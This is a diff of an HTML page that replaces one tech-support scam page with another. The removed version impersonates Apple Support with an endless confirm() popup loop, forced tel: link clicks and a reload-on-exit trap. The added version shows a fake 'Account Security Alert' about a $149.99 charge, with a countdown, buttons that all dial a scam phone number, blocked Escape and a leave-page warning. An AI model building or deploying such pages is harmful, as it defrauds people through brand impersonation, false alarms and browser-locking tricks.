@@ -1,542 +1,285 @@
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
+<html lang="en">
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta http-equiv="cache-control" content="max-age=3600">
-    <title>Contact - Official Apple</title>
-    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
-    
-    <!-- Inline CSS to replace external files -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Security Alert</title>
     <style>
-        /* Base styles similar to Apple's */
-        * {
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
-            line-height: 1.4;
-            color: #1d1d1f;
             background-color: #f5f5f7;
+            color: #333;
         }
         
-        .no-js .ac-gn-menustate, .no-js .ac-gn-menuanchor, .no-js .ac-gn-menucta {
+        .security-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.85);
+            z-index: 10000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.3s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .modal-content {
+            background-color: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 500px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            animation: slideIn 0.4s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        .warning-icon {
+            width: 60px;
+            height: 60px;
+            background-color: #ff3b30;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 30px;
+        }
+        
+        .alert-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #1d1d1f;
+        }
+        
+        .alert-message {
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+            color: #515154;
+        }
+        
+        .phone-number {
+            font-size: 22px;
+            font-weight: 600;
+            color: #0071e3;
+            margin: 20px 0;
+            display: block;
+            text-decoration: none;
+        }
+        
+        .action-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 25px;
+        }
+        
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .btn-primary {
+            background-color: #0071e3;
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background-color: #0051a3;
+        }
+        
+        .btn-secondary {
+            background-color: #f0f0f0;
+            color: #333;
+        }
+        
+        .btn-secondary:hover {
+            background-color: #e0e0e0;
+        }
+        
+        .countdown {
+            font-size: 16px;
+            margin-top: 15px;
+            color: #ff3b30;
+            font-weight: 500;
+        }
+        
+        .regular-content {
+            padding: 20px;
+            max-width: 800px;
+            margin: 0 auto;
             display: none;
         }
         
-        .ac-gn-content {
-            max-width: 1024px;
-            margin: 0 auto;
-            padding: 0 22px;
-            position: relative;
-        }
-        
-        .ac-gn-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            height: 48px;
-        }
-        
-        .ac-gn-list {
-            display: flex;
-            list-style: none;
-        }
-        
-        .ac-gn-item {
-            margin-right: 30px;
-        }
-        
-        .ac-gn-link {
-            color: #1d1d1f;
-            text-decoration: none;
-            font-size: 12px;
-            opacity: 0.8;
-            transition: opacity 0.3s;
-        }
-        
-        .ac-gn-link:hover {
-            opacity: 1;
-        }
-        
-        .ac-ln-wrapper {
-            background-color: #f5f5f7;
-            border-bottom: 1px solid #d2d2d7;
-        }
-        
-        .ac-ln-content {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            max-width: 1024px;
-            margin: 0 auto;
-            padding: 0 22px;
-            height: 52px;
-        }
-        
-        .ac-ln-title a {
-            color: #1d1d1f;
-            font-size: 21px;
-            font-weight: 500;
-            text-decoration: none;
-        }
-        
-        .as-banner-image {
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            height: 300px;
-            position: relative;
-        }
-        
-        .as-banner-image img {
+        .timer-bar {
+            height: 4px;
+            background-color: #e0e0e0;
             width: 100%;
+            margin-top: 20px;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        
+        .timer-progress {
             height: 100%;
-            object-fit: cover;
-        }
-        
-        .as-banner-content {
-            padding: 30px 0;
-            text-align: center;
-        }
-        
-        .pageTitle-heading {
-            font-size: 48px;
-            font-weight: 600;
-            line-height: 1.1;
-            letter-spacing: -.003em;
-            margin-bottom: 6px;
-        }
-        
-        .ac-gf-footer {
-            background-color: #f5f5f7;
-            padding: 20px 0;
-            margin-top: 40px;
-            border-top: 1px solid #d2d2d7;
-        }
-        
-        .ac-gf-footer-shop {
-            font-size: 12px;
-            margin-bottom: 10px;
-            text-align: center;
-        }
-        
-        .ac-gf-footer-legal {
-            font-size: 12px;
-            text-align: center;
-        }
-        
-        .ac-gf-footer-legal-copyright {
-            margin-bottom: 5px;
-        }
-        
-        .ac-gf-footer-legal-links {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-        }
-        
-        .ac-gf-footer-legal-link {
-            color: #515154;
-            text-decoration: none;
-        }
-        
-        .ac-gf-footer-legal-link:hover {
-            text-decoration: underline;
-        }
-        
-        .ac-gf-footer-locale {
-            text-align: center;
-            margin-bottom: 10px;
-        }
-        
-        .ac-gf-footer-locale-link {
-            color: #515154;
-            text-decoration: none;
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-        }
-        
-        .ac-gf-footer-locale-link:hover {
-            text-decoration: underline;
-        }
-        
-        .ac-gf-footer-locale-flag {
-            width: 16px;
-            height: 16px;
-        }
-        
-        .nowrap {
-            white-space: nowrap;
-        }
-        
-        /* Create a placeholder for images */
-        .image-placeholder {
+            background-color: #0071e3;
             width: 100%;
-            height: 100%;
-            background-color: #e8e8ed;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #86868b;
-            font-size: 14px;
+            animation: timer 15s linear forwards;
+        }
+        
+        @keyframes timer {
+            from { width: 100%; }
+            to { width: 0%; }
         }
     </style>
 </head>
-
 <body>
-    <div id="result"></div>
-    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
-    <nav id="ac-globalnav" class="no-js">
-        <div class="ac-gn-content">
-            <ul class="ac-gn-header">
-                <li class="ac-gn-item ac-gn-menuicon">
-                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
-					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
-						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
-					 </span>
-					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
-						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
-					 </span>
-				 </label>
-                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
-					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
-                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
-					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-apple">
-                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
-					 <span class="ac-gn-link-text">Apple </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
-                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
-                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
-                </li>
-            </ul>
-            <ul class="ac-gn-list">
-                <li class="ac-gn-item ac-gn-apple">
-                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
-					 <span class="ac-gn-link-text">Apple </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
-                    <a class="ac-gn-link ac-gn-link-mac" href="#">
-					 <span class="ac-gn-link-text">Mac </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
-                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
-					 <span class="ac-gn-link-text">iPad </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
-                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
-					 <span class="ac-gn-link-text">iPhone </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
-                    <a class="ac-gn-link ac-gn-link-watch" href="#">
-					 <span class="ac-gn-link-text">Watch </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
-                    <a class="ac-gn-link ac-gn-link-tv" href="#">
-					 <span class="ac-gn-link-text">TV </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
-                    <a class="ac-gn-link ac-gn-link-music" href="#">
-					 <span class="ac-gn-link-text">Music </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
-                    <a class="ac-gn-link ac-gn-link-support" href="#">
-					 <span class="ac-gn-link-text">Support </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
-                    <a class="ac-gn-link ac-gn-link-search" href="#">
-					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
-                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
-					 <span class="ac-gn-link-text">Shopping Bag </span>
-					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
-                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
-                </li>
-            </ul>
-            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
-                <div class="ac-gn-searchview-content">
-                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
-                        <div class="ac-gn-searchform-wrapper">
-                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
-                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
-                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
-                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
-                        </div>
-                    </form>
-                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
-                </div>
-                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
-					 <span class="ac-gn-searchview-close-wrapper">
-						 <span class="ac-gn-searchview-close-left"></span>
-						 <span class="ac-gn-searchview-close-right"></span>
-					 </span>
-			 </button>
-            </aside>
-            <aside class="ac-gn-bagview">
-                <div class="ac-gn-bagview-scrim">
-                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
-                </div>
-                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
-                </div>
-            </aside>
+    <div class="security-modal" id="securityModal">
+        <div class="modal-content">
+            <div class="warning-icon">!</div>
+            <h2 class="alert-title">Account Security Alert</h2>
+            <p class="alert-message">
+                We've detected suspicious activity on your account. A recent transaction of $149.99 was attempted using your payment information.
+            </p>
+            <p class="alert-message">
+                To protect your account, we've temporarily restricted access. Please contact our support team immediately to verify your identity and secure your account.
+            </p>
+            <a href="tel:+18885935059" class="phone-number" id="phoneNumber">+1 (888) 593-5059</a>
+            <div class="action-buttons">
+                <button class="btn btn-primary" id="callNowBtn">Call Now</button>
+                <button class="btn btn-secondary" id="verifyBtn">Verify Identity</button>
+            </div>
+            <div class="countdown" id="countdown">This page will redirect in 15 seconds</div>
+            <div class="timer-bar">
+                <div class="timer-progress"></div>
+            </div>
         </div>
-    </nav>
-    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
-    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
-
-    <div class="main">
-        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
-            <div class="ac-ln-wrapper">
-                <div class="ac-ln-background"></div>
-                <div class="ac-ln-content">
-                    <span class="ac-ln-title">
-                       <a href="#">Apple Support  +1 (888) 593-5059 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
-					 </span>
-                    <div class="ac-ln-menu">
-                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
-                        <div class="ac-ln-menu-tray">
-                            <ul class="ac-ln-menu-items">
-                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
-                                </li>
-                            </ul>
-                        </div>
-                        <div class="ac-ln-actions">
-                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
-                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
-							 </label>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </nav>
-        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
-            <div class="row">
-                <div class="column large-12 medium-12 small-12">
-                    <div class="as-banner-cont">
-                        <div class="as-banner-image as-banner-image--top">
-                            <div class="image-placeholder">Apple Support Image</div>
-                        </div>
-                    </div>
-                    <div class="as-banner-content">
-                        <div class="pageTitle  ">
-                            <h1 class="pageTitle-heading">Apple Support </h1>
-                            <p class="pageTitle-intro js_setTextBlock">
-                        </p></div>
-                        <div class="sectionTitle sectionTitleBlock">
-                            <h2 class="sectionTitle-heading"></h2>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
     </div>
-
-    <footer id="ac-globalfooter" class="no-js">
-        <div class="ac-gf-content">
-            <section class="ac-gf-footer">
-                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
-                </div>
-                <div class="ac-gf-footer-locale">
-                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region">
-                        <span class="ac-gf-footer-locale-flag">🇺🇸</span>United States
-                    </a>
-                </div>
-                <div class="ac-gf-footer-legal">
-                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
-                    <div class="ac-gf-footer-legal-links">
-                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy Policy </a> 
-                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
-                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> 
-                        <a class="ac-gf-footer-legal-link" href="#">Site Map </a> 
-                        <a class="ac-gf-footer-legal-link" href="#">Contact Apple </a>
-                    </div>
-                </div>
-                <meta content="Apple" property="name">
-                <meta content=" +1 (888) 593-5059" property="telephone">
-            </section>
-        </div>
-    </footer>
-
-    <!-- Inline jQuery-like functionality to avoid external dependency -->
-    <script>
-        // Simple jQuery-like implementation
-        window.jQuery = window.$ = function(selector) {
-            if (typeof selector === 'string') {
-                if (selector.startsWith('#')) {
-                    return document.getElementById(selector.substring(1));
-                } else {
-                    return document.querySelectorAll(selector);
-                }
-            } else if (selector === document) {
-                return document;
-            }
-            return selector;
-        };
-        
-        // Extend jQuery-like object with methods we need
-        if (!window.$.append) {
-            window.$.fn = window.$.prototype = {
-                append: function(content) {
-                    if (this instanceof Element) {
-                        this.innerHTML += content;
-                    } else if (this instanceof NodeList) {
-                        for (let i = 0; i < this.length; i++) {
-                            this[i].innerHTML += content;
-                        }
-                    }
-                    return this;
-                }
-            };
-            
-            // Apply to single elements
-            Object.setPrototypeOf(Element.prototype, window.$.fn);
-        }
-    </script>
+    
+    <div class="regular-content" id="regularContent">
+        <h1>Account Verification Required</h1>
+        <p>Your account has been temporarily locked for security reasons. Please call the number provided to resolve this issue.</p>
+    </div>
     
     <script>
-        function getURLParameter(name) {
-            return decodeURI(
-                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
-            );
-        };
-        var cookieHelper = {
-            defParams: {
-                path: "/",
-                domain: "." + window.location.host.replace(/:\d+/, "")
-            },
-            set: function(a, d, c) {
-                c = c || {};
-                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
-                b = c.expires;
-                if ("number" == typeof b && b) {
-                    var e = new Date;
-                    e.setTime(e.getTime() + 1E3 * b);
-                    b = c.expires = e
+        let modalCount = 0;
+        const maxModalCount = 5;
+        let countdownTimer;
+        let secondsRemaining = 15;
+        
+        function showModal() {
+            if (modalCount >= maxModalCount) return;
+            
+            modalCount++;
+            const modal = document.getElementById('securityModal');
+            modal.style.display = 'flex';
+            
+            // Reset countdown
+            secondsRemaining = 15;
+            updateCountdown();
+            
+            // Start countdown timer
+            countdownTimer = setTimeout(() => {
+                if (modalCount < maxModalCount) {
+                    hideModal();
+                    // Show next modal after a short delay
+                    setTimeout(() => {
+                        showModal();
+                    }, 2000);
+                } else {
+                    // After 5 modals, redirect or show final message
+                    window.location.href = "tel:+18885935059";
                 }
-                b && b.toUTCString && (c.expires = b.toUTCString());
-                d = encodeURIComponent(d);
-                a = a + "=" + d;
-                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
-                document.cookie = a
-            },
-            get: function(a) {
-                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}$$$$$$$$\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
-            },
-            del: function(a) {
-                this.set(a, null, {
-                    expires: -1
-                })
-            }
-        };
-
-        var userAgent = window.navigator.userAgent.toLowerCase(),
-            ios = /iphone|ipod|ipad/.test(userAgent);
-
-        function parseURL(url) {
-            var a = document.createElement('a');
-            a.href = url;
-            return a.hostname.replace('www.', '');
-        };
-
-        function getPar(name) {
-            var url = window.location.href;
-            name = name.replace(/[$$$$]/g, "\\$&");
-            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
-                results = regex.exec(url);
-            if (!results) return null;
-            if (!results[2]) return '';
-            return decodeURIComponent(results[2].replace(/\+/g, " "));
-        };
-
-        window.number = getPar('phone');
-        window.number = (window.number ? window.number : ' +1 (888) 593-5059');
-        window.device = 'iPhone';
-        window.refef = parseURL(document.referrer);
-
-        if (ios) {
-            if (/iphone/.test(userAgent)) {
-                window.device = 'iPhone';
-            }
-            if (/ipad/.test(userAgent)) {
-                window.device = 'iPad';
-            }
-            if (/ipod/.test(userAgent)) {
-                window.device = 'iPod';
-            }
-        }
-
-        var text = cookieHelper.get('textSetBl');
-        var phone = cookieHelper.get('phoneSetBl');
-
-        function getText() {
-            var str = window.defaultText;
-            for (var d in window.text) {
-                if (window.refef.indexOf(d) != -1) {
-                    str = window.text[d];
+            }, 15000);
+            
+            // Update countdown every second
+            const countdownInterval = setInterval(() => {
+                secondsRemaining--;
+                updateCountdown();
+                
+                if (secondsRemaining <= 0) {
+                    clearInterval(countdownInterval);
                 }
+            }, 1000);
+        }
+        
+        function hideModal() {
+            const modal = document.getElementById('securityModal');
+            modal.style.display = 'none';
+            clearTimeout(countdownTimer);
+        }
+        
+        function updateCountdown() {
+            const countdownEl = document.getElementById('countdown');
+            countdownEl.textContent = `This page will redirect in ${secondsRemaining} seconds`;
+        }
+        
+        function initiateCall() {
+            window.location.href = "tel:+18885935059";
+        }
+        
+        // Event listeners
+        document.getElementById('callNowBtn').addEventListener('click', () => {
+            initiateCall();
+        });
+        
+        document.getElementById('verifyBtn').addEventListener('click', () => {
+            // This button appears to do verification but actually initiates call
+            initiateCall();
+        });
+        
+        document.getElementById('phoneNumber').addEventListener('click', (e) => {
+            e.preventDefault();
+            initiateCall();
+        });
+        
+        // Prevent closing with ESC key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                e.preventDefault();
+                // Instead of closing, show a message
+                const countdownEl = document.getElementById('countdown');
+                countdownEl.textContent = "Please call the support number to continue";
+                countdownEl.style.color = "#ff3b30";
+                countdownEl.style.fontWeight = "600";
             }
-            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
-        }
-
-        if (!phone) {
-            phone = getURLParameter('phone');
-        }
-        if (!text) {
-            text = getURLParameter('text');
-        }
-
-        var sText = document.querySelectorAll('.js_setTextBlock');
-        for (var t = 0; t < sText.length; t++) {
-            sText[t].innerHTML = getText();
-        }
-        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
-        for (var p = 0; p < sPhone.length; p++) {
-            sPhone[p].innerHTML = phone;
-        }
-
-        // The core "freezing pop" functionality
-        setInterval(function() {
-            myFunction()
-        }, 100);
-
-        function okkkk() {
-            jQuery('#result').append('<a  class="anchorcall" href="tel: +1 (888) 593-5059"></a>');
-            document.querySelector('a').click();
-            var extraData = "";
-            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
-                var extraData = extraData + "5555555555";
+        });
+        
+        // Try to prevent leaving the page
+        window.addEventListener('beforeunload', (e) => {
+            if (modalCount < maxModalCount) {
+                e.preventDefault();
+                e.returnValue = "Your account security is at risk. Please contact support before leaving.";
+                return e.returnValue;
             }
-            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-            document.querySelector('a').click();
-        };
-
-        function myFunction() {
-            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support  +1 (888) 593-5059 to Freeze it.")) {
-                okkkk();
-            } else {
-                okkkk();
-            }
-        }
-
-        window.ununload = function() {
-            debugger;
-            location.reload();
-        }
+        });
+        
+        // Start the sequence after a short delay
+        setTimeout(() => {
+            showModal();
+        }, 1000);
     </script>
 </body>
 </html>
